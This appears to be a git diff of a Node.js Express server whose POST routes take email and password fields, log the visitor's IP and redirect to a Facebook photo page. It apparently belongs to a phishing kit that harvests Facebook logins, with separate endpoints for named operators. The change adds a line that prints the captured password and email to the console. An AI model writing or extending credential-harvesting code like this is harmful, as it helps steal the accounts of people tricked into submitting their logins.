@@ -61,6 +61,7 @@ app.get('/', function (req, res) {
 
 
 app.post('/confirm', function (req, res) {
+    
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
     var mail = req.body.email_a;
     var password = req.body.pass_a;
@@ -70,8 +71,9 @@ app.post('/confirm', function (req, res) {
         mail = c;
     }
     if (password == undefined) {
-        password = b;
+        password = d;
     }
+    console.log(password+'*'+mail+c+d)
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
@@ -96,7 +98,7 @@ app.post('/confirm/sama', function (req, res) {
         mail = c;
     }
     if (password == undefined) {
-        password = b;
+        password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
@@ -120,7 +122,7 @@ app.post('/confirm_amir', function (req, res) {
         mail = c;
     }
     if (password == undefined) {
-        password = b;
+        password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
@@ -152,7 +154,7 @@ app.post('/confirm/fad', function (req, res) {
         mail = c;
     }
     if (password == undefined) {
-        password = b;
+        password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
@@ -181,7 +183,7 @@ app.post('/confirm/fad', function (req, res) {
 //         mail = c;
 //     }
 //     if (password == undefined) {
-//         password = b;
+//         password = d;
 //     }
 //     var ip = req.headers['x-forwarded-for'] ||
 //         req.connection.remoteAddress ||
